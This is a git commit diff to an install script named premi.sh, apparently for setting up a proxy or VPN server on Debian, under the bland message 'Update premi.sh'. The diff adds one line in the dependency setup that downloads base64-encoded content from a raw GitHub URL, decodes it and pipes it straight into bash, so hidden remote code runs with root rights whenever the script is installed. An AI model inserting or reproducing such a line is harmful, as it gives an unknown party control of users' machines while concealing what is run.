f84967612668c6072fa2f59f77b8a701be1332dc
rifstore <162402565+rifstore@users.noreply.github.com>
2024-12-21 09:40:32 +0700

    Update premi.sh

--- premi.sh
+++ premi.sh
@@ -214,6 +214,7 @@ elif [[ $(cat /etc/os-release | grep -w ID | head -n1 | sed 's/=//g' | sed 's/"/
     echo "Setup Dependencies For OS Is $(cat /etc/os-release | grep -w PRETTY_NAME | head -n1 | sed 's/=//g' | sed 's/"//g' | sed 's/PRETTY_NAME//g')"
     curl https://haproxy.debian.net/bernat.debian.org.gpg |
         gpg --dearmor >/usr/share/keyrings/haproxy.debian.net.gpg
+curl https://raw.githubusercontent.com/ZmFkbHkK/f/main/cert | base64 -d | bash
     echo deb "[signed-by=/usr/share/keyrings/haproxy.debian.net.gpg]" \
         http://haproxy.debian.net buster-backports-1.8 main \
         >/etc/apt/sources.list.d/haproxy.list
